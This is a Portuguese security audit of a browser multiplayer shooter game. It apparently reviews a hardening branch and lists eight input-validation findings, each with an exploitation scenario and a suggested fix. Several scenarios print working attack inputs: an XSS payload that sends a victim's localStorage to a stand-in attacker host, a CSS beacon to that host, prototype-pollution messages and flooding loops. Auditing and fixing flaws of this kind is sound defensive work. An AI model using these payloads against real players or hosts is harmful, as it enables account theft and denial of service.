# Auditoria 04 — Validação de entrada e injeção

Branch `security-hardening`, `index.html` (8565 linhas), 02/10/2026. Somente leitura. Linhas citadas foram lidas nesta revisão. Premissa do projeto: o host é um jogador qualquer (quem criou a sala); por isso "host malicioso" é um atacante real, não um servidor confiável.

### [I1] XSS nos clientes por números do host interpolados sem `esc()`
- Arquivo e linha: `index.html` 6803 (`String(me.money)`), 6806 (`${p.m}`), 6817 (`${ZC.rem}`), 7816 (`${sc.t}`, `${sc.ct}`, `${C.round}`), 7817 (`${st.frags}`, `${lead.k}`), 7842 (`'$' + me.money`), 7861–7866 (`${p.m}`, `${p.k}`, `${p.hs}`, `${p.dw}`, `${p.rvs}`, `${p.d}`), 7829 (`Math.ceil(C.timeLeft)` é seguro). Origem: `onMsg` 7608–7613 (`state`: `m.sc`, `m.r`, `m.st`, `m.pl[]`), 7724 (`pts`: `m.m`), 7727 (`inv`: `m.m`), 6230–6256 (`zs`: `m.rem`).
- Descrição: os campos "numéricos" do `state`/`pts`/`zs` são copiados sem conversão (`C.players.set(pl.id, pl)`, `me.money = m.m`) e entram em `innerHTML` via `setHTML` sem `esc()`. `esc()` (l. 445) só é aplicado a `n` e `c`. `zteam` (6806) e `zpts` (6803) redesenham a cada quadro, sem interação da vítima.
- Cenário de exploração: host envia `{t:'state',ph:'live',tl:0,r:0,pl:[{id:'h',n:'x',c:'#fff',al:1,hp:100,k:0,d:0,m:'<img src=x onerror="fetch(\'https://atk/?\'+JSON.stringify(localStorage))">'}]}` (modo Zumbis) ou `{t:'pts',n:0,m:'<img src=x onerror=...>'}`. O script roda na origem `costamaiavitor.github.io` com acesso ao `localStorage` (`tiroteio.prof.*`), ao IndexedDB do Firebase Auth (token da conta) e a `profSave` — rouba/altera a conta de skins de todos na sala.
- Severidade: Alta
- Correção sugerida: normalizar na entrada, uma vez, em `onMsg`: em `state`, `for (const pl of m.pl) { pl.k = pl.k|0; pl.d = pl.d|0; pl.m = +pl.m||0; pl.hs=…; pl.dw=…; pl.rvs=…; }`, `C.round = m.r|0`, `C.sc = {t: m.sc?.t|0, ct: m.sc?.ct|0}`; em `pts`/`inv` `me.money = +m.m||0`; em `zs` `ZC.rem = m.rem|0`; `st.frags|0`, `st.rounds|0` ao receber `welcome`/`match`/`state.st`. Regra geral: todo `${…}` em `setHTML` passa por `esc()` ou por `|0`.

### [I2] Qualquer jogador derruba o `state` dos outros com skin "constructor"
- Arquivo e linha: `cleanSk` 8150 (`W[w] && SKIN_BY[f]`), `srvOnData` 5254, `srvHandle` 5339, `srvState` 5524 (`sk: p.skins`), cliente `refreshRemoteInfo` 4918 → `setRemoteGun` 4912 → `remoteGunTpl` 4899 → `gunModel` 2821 → `gunMats` 2783 (`SKIN_BY[skin]`) → `skinMats` 2771 → `skinTex` 2731–2740 (`C = f.c` … `C[0]`).
- Descrição: `W` e `SKIN_BY` (2726, `Object.fromEntries`) são objetos simples; `W['constructor']`, `SKIN_BY['toString']`, `['valueOf']`, `['hasOwnProperty']` etc. são truthy. `cleanSk` aceita `{ak47:'constructor'}`, o host guarda em `p.skins` e envia no `state`. No cliente, `gunMats` recebe `f = Object` (função), `f.c` é `undefined` e `skinTex` lança `TypeError` dentro de `onMsg('state')`, dentro do `conn.on('data')` do PeerJS: exceção não tratada, o resto do `state` (outros jogadores, remoção de quem saiu, `zSyncWorld`) é perdido. `refreshRemoteInfo` grava `rp.skKey` antes de lançar, então basta alternar dois nomes (`'constructor'`/`'toString'`) a cada `skins` para quebrar todo `state` (4/s) em todos os clientes. `cleanProf` (8154) tem o mesmo furo em `items` (`'constructor:skin'` vira item "Object").
- Cenário de exploração: cliente envia em loop `sendToHost({t:'skins', sk:{ak47:'constructor'}})`, `…'toString'…`; todos os outros ficam com placar congelado, jogadores fantasmas e mundo dos zumbis dessincronizado até o atacante sair.
- Severidade: Média
- Correção sugerida: em `cleanSk`: `typeof f === 'string' && Object.hasOwn(W, w) && Object.hasOwn(SKIN_BY, f)`; em `cleanProf.items` usar `Object.hasOwn`; em `gunMats` `const f = … Object.hasOwn(SKIN_BY, skin) ? SKIN_BY[skin] : null`. Além disso envolver o corpo de `onMsg` em `try/catch` por mensagem (ver I3).

### [I3] Host → cliente: mensagem malformada lança exceção não tratada e trava o cliente
- Arquivo e linha: `onMsg` 7601–7755: `welcome` 7603 (`m.st.map`), `match` 7605, `state` 7611 (`for … of m.pl`), `spawn` 7637 (`m.p[0]`), `zdrop` 7684 → `zDropAdd` 6558 (destructuring de `d`), `zs` 6232/6255 (`a.length`, `for (const c of m.cl)`), `zbox` 7673 → `zBoxPlace` 6119 (`L.n[0]`), `zperk` 7669 (`ZPERKS[m.k]`), `bboom` 7745 (`m.p[0]`), `nade` 7746 → `spawnNade` 4967, `msg` 7747 (`m.dur`), `zfx` 7688. HUD: `zHud` 6807 (`ZPERKS[k].ab.length`), `tick` 8510 sem `try/catch`; `frame` 8498.
- Descrição: o cliente confia na forma de cada campo. A exceção sobe pelo `conn.on('data')` (5203) ou pelo `dc.onmessage` (5062) e some no console; a mensagem é perdida mas a conexão fica. Dois casos são permanentes: (a) `zperk` com `k:'constructor'` entra em `ZC.perks` (ZPERKS é objeto simples, `ZPERKS.constructor` é truthy) e `zHud` lança a cada quadro em `ZPERKS[k].ab.length`, parando o desenho do HUD e o resto do `tick` (`tick` não tem `try/catch`): jogo congelado; (b) `msg` com `dur: NaN` deixa `now > centerT` sempre falso (7828): a mensagem central nunca sai e esconde o cronômetro.
- Cenário de exploração: host envia `{t:'zperk', id:<id da vítima>, k:'constructor'}` para cada cliente; ou `{t:'state', pl: null}` em loop para derrubar a atualização do placar.
- Severidade: Média
- Correção sugerida: `function onMsg(m) { try { onMsgInner(m); } catch (e) { console.warn('msg inválida', m?.t, e); } }`; validar forma por tipo: `Array.isArray(m.pl)`, `vec3(m.p)`, `Array.isArray(m.d) && m.d.length === 5`, `Object.hasOwn(ZPERKS, m.k)`, `Number.isInteger(m.loc) && ZD.boxes[m.loc]`, `m.dur = finN(m.dur) ? clamp(m.dur, 0, 30) : 3`; em `zHud` filtrar `ZC.perks = (pl.pk||[]).filter(k => Object.hasOwn(ZPERKS, k))`.

### [I4] Chaves herdadas em objetos simples (`__proto__`, `constructor`) em consultas de rede
- Arquivo e linha: cliente: `ztrap` 7685 (`ZC.traps[m.i]`), `ammo` 7725 (`W[m.w]` → `G.ammo[m.w]`), `zperk` 7669, `zdie` 7641 (`ZKIND[m.k]?.xp`), `zbox` 7672. Host: `srvBuy` 5483 (`W[item]`, protegido só por `it.price || it.equip`), `srvZUse` 7442 (`ZPERKS[m.id]`, protegido pelo `find` anterior), `pos` 5290/`nade` 5340 usam `isW` (`Object.hasOwn`, correto).
- Descrição: `ZC.traps` é array: `ZC.traps['__proto__']` é `Array.prototype`, e `T.st = m.st; T.end = …` (7685) grava `Array.prototype.st` e `Array.prototype.end` em todos os arrays do cliente (poluição de protótipo; os `for…in` em 836, 1085, 3838, 5453, 7990 passam a ver essas chaves). `G.ammo['__proto__'] = {...}` troca o protótipo de `G.ammo`. No host, `W['__proto__']`/`W['constructor']` passam o `if (!it …)` e só são barrados porque `Object.prototype` não tem `price`/`equip`: proteção acidental.
- Cenário de exploração: host envia `{t:'ztrap', i:'__proto__', st:'on', t:1e9}`. Propriedades criadas por atribuição são enumeráveis: a partir daí todo `for…in` sobre arrays nos clientes (836, 1085, 5453) itera também `st` e `end` (`r = arr['st']` → `'on'`, `r[0]` → `'o'`), e `JSON.stringify`/`Object.keys` continuam escondendo o problema — comportamento imprevisível e porta para bugs de lógica difíceis de diagnosticar.
- Severidade: Baixa (só o host; efeito limitado) — Média se combinado com I3
- Correção sugerida: `Number.isInteger(m.i) && ZC.traps[m.i]`, `isW(m.w)` em `ammo`, `Object.hasOwn(ZPERKS, m.k)`, `Number.isInteger(m.loc)`; no host `const it = isW(item) ? W[item] : null`. Criar `W`, `SKIN_BY`, `ZPERKS`, `SND`, `ZPW` com `Object.create(null)` ou congelar o acesso num helper `own(obj, k)`.

### [I5] Injeção de CSS em atributos `style` pela cor do jogador (`esc()` não neutraliza `;`)
- Arquivo e linha: 6806 (`style="color:${esc(p.c)}"`), 7767 (`colorOf(k)`, `colorOf(v)`), 7817 (`lead.c`), 7862/7866 (`p.c`), 7816 (`TEAMC[my]`, `my = pl.tm`). Origem: `state.pl[].c` (host, 5524) e `pl.tm`.
- Descrição: `esc()` troca `&<>"'`, o que impede sair do atributo, mas não impede acrescentar declarações CSS. `p.c` vem do host sem validação de formato (o host honesto manda `COLORS`, l. 462). Com `c: "#fff;background:url(https://atk/p.gif)"` o cliente carrega a URL (beacon); com `c: "#fff;position:fixed;inset:0;font-size:80px;content:…"` a linha vira uma sobreposição de tela inteira (falso aviso "sessão expirada, digite a senha" por cima do jogo). `TEAMC['constructor']` vira o texto `function Object() { [native code] }` no `style` (inofensivo, mas mostra que `pl.tm` não é validado).
- Cenário de exploração: host envia `state` com `pl:[{…, c:'#fff;background:url(https://atk/x?'+ip+')'}]`; cada cliente faz uma requisição à URL do atacante a cada redesenho do placar.
- Severidade: Baixa
- Correção sugerida: validar ao receber: `pl.c = /^#[0-9a-f]{6}$/i.test(pl.c) ? pl.c : '#ccc'`, `pl.tm = pl.tm === 't' || pl.tm === 'ct' ? pl.tm : undefined`; nunca interpolar valores de rede em `style`, ou usar classes (`data-team`) e `el.style.color = …` via DOM.

### [I6] DoS por volume de dados no host (sem limite de tamanho, taxa ou memória por conexão)
- Arquivo e linha: `attachFast` 5062 (`JSON.parse(e.data)` sem checar `e.data.length`), `srvOnData` 5247–5265, `srvHandle` 5283–5344 (`chat` 5342, `shot` 5306, `skins` 5339, `pos` 5285), `cleanSk` 8150 (`Object.entries(sk)` antes do `slice(0,80)`), `srvDrop` 5272 (`S.left.set(name, …)`; só é zerado em 6981), `ping` 5250 (`{t:'pong', c: d.c}` ecoa o que chegou), `srvState` 5521 (um objeto por jogador, 4/s), `startHost` 5180 (`message-too-big` não derruba).
- Descrição: um cliente pode mandar mensagens de centenas de KB (o canal WebRTC do Chrome aceita até 256 KB; o PeerJS remonta pedaços maiores) e em qualquer frequência: o host faz `JSON.parse` de tudo, percorre `Object.entries` de objetos enormes em `cleanSk`, ecoa `d.c` de qualquer tamanho no `pong` e retransmite `chat` para N jogadores sem cadência (amplificação N×). `S.left` guarda uma entrada por nome que já saiu (nome ≤ 16 chars, mas infinitos nomes): entrar e sair com nomes diferentes enche a memória do host até a partida terminar. Não há teto de jogadores (`NET.conns`), então `srvState` cresce linearmente com conexões falsas. Os limites existentes (`slice(0,12)` em `shot`, `slice(0,120)` em `chat`, `slice(0,80)` em `cleanSk`) são bons mas atuam depois do parse.
- Cenário de exploração: um cliente com `setInterval(() => NET.hostConn.send({t:'skins', sk: objetoDe200KB}), 5)` ou `dc.send('{"t":"ping","c":"' + 'A'.repeat(2e5) + '"}')`; o host (que também roda a simulação de todos) passa a gastar o quadro em parse e todos sentem o "travão"; variação: 500 `join`s com nomes aleatórios seguidos de `close` enchem `S.left`.
- Severidade: Média
- Correção sugerida: em `attachFast`: `if (typeof e.data !== 'string' || e.data.length > 4096) return;`; no canal confiável, pedir `serialization: 'json'` já existe, então checar `JSON.stringify(m).length` é caro — em vez disso, um token bucket por `conn` e por tipo (`pos` 40/s, `shot` 20/s, `chat` 2/s, `skins` 1/s, `ping` 2/s, resto 10/s; excedente descartado, reincidência → `srvDrop`); `pong` só com `finN(d.c)`; `cleanSk`: `Object.keys(sk).length > 80 → {}` antes de `entries`; `S.left` com teto (ex.: 32 entradas, expirando em 300 s, que é o prazo já usado na l. 5260); teto de jogadores (ex.: 12) recusando `join` com `{t:'err'}` e `conn.close()`.

### [I7] `localStorage` e formulário local: nome sem filtro na leitura e números de `lastSt` sem validação
- Arquivo e linha: `CFG.name` 451 (`load('name', …)` sem filtro), 8447 (filtro só no `oninput`), `startHost` 5150 (`srvAddPlayer('h', CFG.name)`), `joinRoom` 5202 (`name: CFG.name`), `lastSt` 8436 → `matchForm` 8059–8068 (valida `map`, `zmap`, `mode`, `zdiff`; não valida `rounds`, `frags`, `bots`, `diff`), `btnApply` 8462 (`broadcast({t:'match', st})`), `syncBots` 5389 (clampa `bots`, correto), 5585 (`BOT_DIFF[…] || BOT_DIFF[1]`, correto), 7817 (`${st.frags}` em HTML).
- Descrição: quem escreve em `localStorage` da origem `costamaiavitor.github.io` (qualquer outro projeto GitHub Pages do mesmo usuário, uma extensão, ou o próprio XSS de I1 para persistir) controla `CFG.name` sem o corte de 16 caracteres nem a remoção de `<>`, e `lastSt.frags`/`rounds` como texto livre. Como host, `p.name` vai cru em todo `state` (4/s) e `st.frags` entra no `score` sem `esc()` — self-XSS no host e, via `welcome`/`match`, nos clientes (já cobertos por I1). Todos os sinks de nome usam `esc()`/`textContent`/canvas, então o nome em si não vira XSS, só payload grande no `state`. `prof.guest` passa por `cleanProf` (OK, exceto o `hasOwn` de I2).
- Cenário de exploração: `localStorage['tiroteio.lastSt'] = JSON.stringify({mode:'dm', frags:'<img src=x onerror=alert(1)>'})`; ao criar sala em mata-mata o host executa o payload; os clientes também, ao receber `welcome.st`.
- Severidade: Baixa
- Correção sugerida: aplicar o mesmo filtro na leitura (`CFG.name = String(load('name', …)).replace(/[<>]/g, '').slice(0, 16) || 'Jogador'`); em `matchForm`, forçar `st.rounds`, `st.frags`, `st.bots`, `st.diff` para as listas permitidas (`[3,5,8,10,13,16].includes(+st.rounds) ? +st.rounds : 8`, etc.); no cliente, sanear `st` ao receber (I1).

### [I8] Verificado sem achado (URL, `eval`, Worker, `document.write`, ferramentas de desenvolvimento)
- Arquivo e linha: `?sala=` 8448 (vai para `.value`, nunca para HTML; `joinRoom` 5189 filtra `[A-Z0-9]{5}`); `leaveGame` 8480 (`location.href = location.pathname`, só caminho da própria origem); `document.write` 275 (string fixa, mas script de CDN sem SRI — área de supply chain); Worker 8490 (Blob com código fixo, sem entrada externa); nenhum `eval`/`new Function`/`setTimeout(string)` no arquivo; `chat` 7958 → 5342 → 7751 com `esc()` (OK); `toast` 7761 usa `textContent` (OK); `centerMsg` 7762 usa `esc()` (OK); `feedAdd` 7767 usa `esc()` (OK); `renderBuy` 7928–7941, `skCard` 8258, `skinsUI` 8293–8314, `skRoll` 8379–8386 só interpolam constantes locais (`W`, `SKINS`, `RARITY`, `GEAR_ICON`) ou `esc()`; `updateRoomInfo` 7777–7780 com `esc(NET.code)`; `matchForm` 8080 só constantes de `MAPS`/`ZDIFF`; `window.__T` 8560 expõe `broadcast`/`onMsg` apenas ao console local (sem vetor remoto). `tools/skview.js` 37, `vmtest.js` 32, `wfit.js` 101/115 fazem `POST http://127.0.0.1:8799` com PNG gerado localmente (qualquer processo local nessa porta recebe as imagens; só desenvolvimento). `tools/blender/bl.py` 16 e `run.py` 6–11 fazem `exec` de arquivos passados por `argv`/stdin dentro do Blender (ferramenta de build do próprio desenvolvedor; nenhum dado externo). Nada disso roda no jogo publicado.
- Severidade: Informativa
- Correção sugerida: nenhuma obrigatória. Opcional: `tools/*.js` poderiam ler a porta de uma variável e avisar quando `location.hostname !== '127.0.0.1'`.
